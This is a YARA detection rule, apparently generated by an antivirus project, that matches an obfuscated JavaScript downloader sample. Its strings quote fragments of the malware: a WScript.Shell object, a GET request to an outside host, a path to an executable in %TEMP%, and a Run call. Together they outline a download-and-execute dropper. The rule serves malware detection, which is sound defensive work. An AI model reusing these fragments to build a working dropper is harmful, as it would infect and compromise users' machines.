rule sig_20160328_18e430021623ae301b32062dbcb3bd35 {
  meta:
    description = "datamaliciousorder - file 20160328_18e430021623ae301b32062dbcb3bd35.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "de628ab67fb4edf7b67d0d89f0b0d8c9259f3e45e2b0c98d0fd0eb69d69ef2f6"

  strings:
    $s1  = "function Qakde() {return Dgtkm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kF8ry02fbx.exe\";};" fullword ascii
    $s2  = "Xlzacknyy[Imldzrydtz](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Vocxbwstzb](Jpeyvvpho() * 11)} while (Xlzacknyy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dgtkm = function Ptoqaare() {return WScript[Axcmazg](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ymiimq(Hwonainxfd, Pmcnbqdyaq){return Hwonainxfd - Pmcnbqdyaq;};" fullword ascii
    $s6  = "function Mhabffnhl(Rythz){Dgtkm[\"Run\"](Rythz, Hqzaxkvb, Hqzaxkvb);};" fullword ascii
    $s7  = "function Brdyniijf() {return ((Vxzqgewyco == true) && (Vxzqgewyco == Jfjsvncthh)) ? 1 : Hqzaxkvb;};" fullword ascii
    $s8  = "function Ymfcy(){return Wlvobt;};" fullword ascii
    $s9  = "function Jpeyvvpho(){return 22;};" fullword ascii
    $s10 = "return Ymiimq(Icdvrus, Pkmrp);" fullword ascii
    $s11 = "var Jfjsvncthh = false;" fullword ascii
    $s12 = " while (Hfecjx){" fullword ascii
    $s13 = "var Vxzqgewyco = false;" fullword ascii
    $s14 = "function Extsf()" fullword ascii
    $s15 = "var Oyicnfbw = new this[\"Date\"]();" fullword ascii
    $s16 = "Vxzqgewyco = true; " fullword ascii
    $s17 = "function Kcituxt(Krbhmiz) {var Fhuuei = (1, 2, 3, 4, 5, Krbhmiz); return Fhuuei;};" fullword ascii
    $s18 = "Jfjsvncthh = true; " fullword ascii
    $s19 = "var Mbfcdjryi = false;" fullword ascii
    $s20 = "function Qtxelsrssr(){return Axcmazg;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}